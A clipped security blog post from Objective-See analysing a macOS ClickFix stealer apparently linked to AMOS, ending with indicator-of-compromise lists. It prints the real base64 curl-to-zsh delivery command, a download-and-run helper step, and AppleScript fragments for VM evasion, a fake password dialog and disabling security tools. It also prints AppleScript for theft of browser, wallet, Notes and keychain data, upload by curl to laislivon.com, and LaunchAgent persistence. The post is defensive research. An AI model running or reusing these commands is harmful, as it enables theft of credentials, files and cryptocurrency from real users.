---
title: Objective-See's Blog
source: https://objective-see.org/blog/blog_0x88.html
source_host: objective-see.org
clip_date: 2026-09-14T10:20:29+08:00
trace_id: eb632ff9-13c5-4d7b-81b7-f05328b573a3
content_hash: 18ce0aa7f1997622ab3995beef7245a402150268e6d61068ff345eca77fad190
status: synced
tags:
  - 恶意样本
  - macOS安全
series: null
feed_source: Objective-See·macOS
ai_summary: macOS 窃密样本通过伪造软件更新页面诱导用户复制粘贴 ClickFix 命令执行，集成 VM 检测、伪装密码弹窗、256 个加密钱包扩展窃取与 LaunchAgent 持久化，多处特征指向 AMOS 家族。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3db75244-d011-8168-8fb5-dfe6fed134f4
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> macOS 窃密样本通过伪造软件更新页面诱导用户复制粘贴 ClickFix 命令执行，集成 VM 检测、伪装密码弹窗、256 个加密钱包扩展窃取与 LaunchAgent 持久化，多处特征指向 AMOS 家族。
> 
> - **投递链：** `curl -LsfSk` 解码 base64 后管道给 `zsh`，随后从 `rvdownloads.com/frozenfix/update` 拉取 helper 并 chmod 执行；`rvdownloads.com` 为新 IoC，`Mac-force.squarespace.com` 与既往 AMOS 活动手法一致。
> - **混淆手法：** AppleScript 字符串转为数字数组，用 `ssooouzowk`（减法）、`uyvhofylsr`（加法）、`ljmhoouy`（带偏移减法）三个函数还原，涉及 `gmeaaapd0`~`gmeaaapd434` 共 400+ 变量。
> - **反分析与嗅探：** 首个脚本调用 `system_profiler` 检查 QEMU/VMware/KVM，以及特定 Mac 序列号、"Chip: Unknown""Intel Core 2"，命中即 `exit 100`。
> - **窃密范围：** 弹出假"System Helper"对话框循环校验密码并存入 `~/.pwd`；`killall` 终止 Little Snitch、BlockBlock 并卸载 LuLu；抓取多浏览器登录数据、Cookie、autofill 与扩展设置；硬编码 256 个钱包扩展 ID（MetaMask、Phantom、Coinbase、Binance、OKX 等）；复制 Apple Notes 数据库与媒体附件、经 `security find-generic-password` 读取 Safari 密码、打包桌面与文档中 30MB 内指定类型文件。
> - **外传与持久化：** `tar -czf` 归档后 `curl -X POST` 上传至 `laislivon.com/upload`；写入 `~/Library/LaunchAgents/com.apple.mdworker.plist`（Label 为 `com.apple.systemupdate`，RunAtLoad 与 KeepAlive 为 true），内联完整脚本，每次登录重跑。

Catching macOS Stealers in the Wild

...or how I became threat hunter by accident

The **Objective-See Foundation** is supported by:

## Background

Last week I encountered a macOS stealer sample (probably related to AMOS Stealer). A computer was delivered to me to analyze the impact, the source, and, in general aspects, where did this little sample come from.

The sample was out there, advertised on the internet and simulating legit software updates. When I began analyzing the sample, the original domain was already taken down, but the initial command comes from `Mac-force.squarespace.com`. Squarespace domains have been used before in different AMOS campaigns, disguised as Claude-docs, n8n updates, and different tools. First indicator that this malware might be related to AMOS campaign. However, the `rvdownloads.com` domain as IoC seems to be really new, so add it to your IoC list for AMOS or similar stealers.

## Initial Infection Vector

The original payload is:

```bash
curl -LsfSk $(echo 'aHR0cHM6Ly9ydmRvd25sb2Fkcy5jb20vY3VybC85ZTY0ZTNiMWUwNTQ3YTMxOTU1NDFmODM4MDk5ZmEwMDJjZjc1Y2JjMTI1ZDNiYjkwY2Q5NjQ5ZjhlODVjNjAy'|base64 -D)| zsh
```

As seen before in different ClickFix attacks… A nice `curl` + base64 decode + `zsh` combo.

The payload is pointing to `rvdownloads.com`, then a subsequent curl is executed, again to `rvdownloads.com/frozenfix/update`. Here, the malware pulls a file using the following execution pattern. I would have liked to show the helper file, however, the computer that arrived to my hands had already been restarted, losing the file, and the persistence never reached to execute due to Defender jumping in:(:

```bash
curl -o /tmp/helper rvdownloads.com/frozenfix/update
chmod +x /tmp/helper
/tmp/helper
```

## The Obfuscation Technique

And this is where the real magic begins. The helper manages to execute 2 different AppleScripts. Both of them obfuscated, but retrieving the original ones has been easy. The obfuscation consists of strings converted into arrays, split with different mathematical operations.

Example:

```applescript
mutizk({258, 281, 287, 336, ...}, {143, 160, 172, 220, ...})

# Decodes to:
258 - 143 = 115 = 's'
281 - 160 = 121 = 'y'
287 - 172 = 115 = 's'
336 - 220 = 116 = 't'
285 - 184 = 101 = 'e'
321 - 212 = 109 = 'm'
```

The malware uses **three different mathematical deobfuscation functions** throughout the script:

-   `ssooouzowk()` - Simple subtraction decoder
-   `uyvhofylsr()` - Addition decoder
-   `ljmhoouy()` - Subtraction with offset decoder

All strings are encoded this way - **400+ variables** named `gmeaaapd0` through `gmeaaapd434`.

## 1st AppleScript: VM Detection

Typical VM check using `system_profiler`:

```applescript
set memory_check to "system_profiler SPMemoryDataType"
set hardware_check to "system_profiler SPHardwareDataType"

set memory_output to do shell script memory_check
set hardware_output to do shell script hardware_check

# VM indicators to check in memory data:
set vm_indicators to {"QEMU", "VMware", "KVM"}

# Hardware serial numbers and identifiers to check:
set hardware_indicators to {
    "Z31FHXYQ0J",        # Specific Mac serial
    "C07T508TG1J2",      # Specific Mac serial
    "C02TM2ZBHX87",      # Specific Mac serial
    "Chip: Unknown",     # Unknown chip indicator
    "Intel Core 2"       # Old Intel processor
}

set is_vm_or_sandbox to false

# Check memory output for VM indicators
repeat with indicator in vm_indicators
    if memory_output contains indicator then
        set is_vm_or_sandbox to true
        exit repeat
    end if
end repeat

# If not found, check hardware output
if not is_vm_or_sandbox then
    repeat with indicator in hardware_indicators
        if hardware_output contains indicator then
            set is_vm_or_sandbox to true
            exit repeat
        end if
    end repeat
end if

# Exit with code 100 if VM/sandbox detected, 0 otherwise
if is_vm_or_sandbox then
    do shell script "exit 100"
else
    do shell script "exit 0"
end if
```

This way of checking serial numbers has been commented on in other AMOS analysis - another sign of correlation to AMOS campaigns.

**Source:** [TrendMicro AMOS Stealer Analysis](https://www.trendmicro.com/es_es/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html)

## 2nd Script: The Big One

Here’s where the real stealer is, and it has what you’d expect from any stealer: browser passwords, Telegram data, crypto wallet data, and persistence via LaunchAgent.

### Password Phishing via Fake System Dialog

First, it shows a convincing fake system dialog to steal the user’s password:

```applescript
display dialog "Application wants to install helper" & return & return & ¬
    "Required Application Helper. Please enter device password to continue." & return ¬
    default answer "" with title "System Helper Installation" ¬
    with icon caution ¬
    buttons {"Continue"} default button 1 ¬
    with hidden answer
```

The malware **validates the password against the system keychain** and loops until it gets the correct one! Once it has the password, it stores it in `~/.pwd` for later use.

### Security Tool Killing

Before stealing data, it kills common macOS security tools, it caught my attention that they specially want to disable some of the Objective See Tools:

```applescript
do shell script "killall -9 \"Little Snitch\" 2>/dev/null"
do shell script "killall -9 \"BlockBlock\" 2>/dev/null"
do shell script "launchctl unload ~/Library/LaunchAgents/com.objective-see.lulu.plist 2>/dev/null || true"
```

### Browser Data Theft

The stealer targets **multiple browsers**:

```applescript
set browser_paths to {
    "Google/Chrome",
    "BraveSoftware/Brave-Browser", 
    "Microsoft Edge",
    "Opera Software",
    "FireFox"
    # ... and more
}

# For each browser, it steals:
# - Login Data (passwords)
# - Cookies
# - Web Data (autofill)
# - Local Extension Settings (crypto wallets!)
```

### Cryptocurrency Wallet Targeting - 256 Extensions!

This is where it gets interesting. The malware has a hardcoded list of **256 cryptocurrency wallet browser extension IDs**:

```applescript
property crypto_wallet_extensions : {
    "nkbihfbeogaeaoehlefnkodbefgpgknn",  # MetaMask
    "bfnaelmomeimhlpmgjnjophhpkkoljpa",  # Phantom
    "hnfanknocfeofbddgcijnmhnfnkdnaad",  # Coinbase Wallet
    "fhbohimaelbohpjbbldcngcnapndodjp",  # Binance Wallet
    "aiifbnbfobpmeekipheeijimdpnlpgpp",  # TerraStation
    "ejbalbakoplchlghecdalmeeeajnimhm",  # MetaMask (duplicate ID)
    "mcohilncbfahbmgdjkbpemcciiolgcge",  # OKX Wallet
    # ... 250 more extension IDs
}
```

The stealer specifically searches for these extensions in the browser’s `Local Extension Settings` folder, where crypto wallets store their encrypted data.

### Apple Notes Theft

A particularly nasty capability - it steals Apple Notes data:

```applescript
# Targets the Notes database and attachments
set notes_db to "~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite"
set notes_media to "~/Library/Group Containers/group.com.apple.notes/Media/"

# Copies both database and all media attachments
do shell script "cp -r " & quoted form of notes_db & " /tmp/exfil/"
do shell script "cp -r " & quoted form of notes_media & " /tmp/exfil/"
```

People often store sensitive info in Notes - passwords, seed phrases, API keys, etc.

### Safari Keychain Access

The malware abuses the stored password to extract Safari passwords from the keychain:

```applescript
set safari_password_cmd to "security find-generic-password -ga 'Safari' -w 2>&1"
do shell script safari_password_cmd with administrator privileges
```

### Document Grabber

It also steals files from Desktop and Documents:

```applescript
set target_folders to {"~/Desktop", "~/Documents"}
set max_size to 30 * 1024 * 1024  # 30MB

# Copies files matching certain extensions:
# .txt, .pdf, .doc, .docx, .xls, .xlsx, .key, .pages, .numbers
```

### Data Exfiltration to C2

All stolen data is compressed and exfiltrated:

```applescript
# Create archive
do shell script "cd /tmp/stolen_data && tar -czf /tmp/archive.tar.gz *"

# Exfiltrate via curl
set upload_cmd to "curl -X POST -F 'file=@/tmp/archive.tar.gz' https://laislivon.com/upload"
do shell script upload_cmd
```

The C2 domain `laislivon.com` is **also related to previous AMOS campaigns**.

### Persistence via LaunchAgent

Finally, the malware establishes persistence by creating a LaunchAgent plist:

```applescript
# Writes to ~/Library/LaunchAgents/com.apple.mdworker.plist
# (mimicking the legitimate Spotlight mdworker process)

set plist_content to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"...\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    
    <key>RunAtLoad</key>
    <true/>
    
    <key>KeepAlive</key>
    <true/>
    
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>osascript -e '[ENTIRE MALWARE SCRIPT INLINE]'</string>
    </array>
    
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>"

# Load it
do shell script "launchctl load ~/Library/LaunchAgents/com.apple.mdworker.plist"
```

The plist contains the **complete obfuscated AppleScript inline** - This means every login re-runs the entire stealer.

## IOCs (Indicators of Compromise)

### Network Indicators

```
Domain: laislivon.com
Domain: rvdownloads.com
Domain: Mac-force.squarespace.com
URL: rvdownloads.com/frozenfix/update
```

### File System Indicators

```bash
~/Library/LaunchAgents/com.apple.mdworker.plist
~/.username
~/.pwd
~/.marker
/tmp/helper
/tmp/update_[0-9]+/
/tmp/archive.tar.gz
~/.config/ (staging directory)
~/.local/ (staging directory)
```

### Process Indicators

```
osascript -e '[long inline script]'
curl (spawned by osascript, connecting to laislivon.com)
launchctl load ~/Library/LaunchAgents/*.plist
security find-generic-password -ga "Chrome" -w
```

### LaunchAgent Indicators

```yaml
Label: com.apple.systemupdate
Label: com.apple.mdworker
File: ~/Library/LaunchAgents/com.apple.mdworker.plist
RunAtLoad: true
KeepAlive: true
```

## Conclusion

There are a lot of clickfix samples out there, the investment malware actors do on positioning their samples on places like google ads makes it really easy to fall on of them if you are not a technical user, or you are copying-pasting commands without validating.

Just wanted to share this with the macOS community who might be into Mac malware, and also for the good people out there building macOS defensive tools!

Stay safe! 🍎🔒

* * *

Full deobfuscated samples and Python deobfuscation scripts available upon request for threat research purposes.
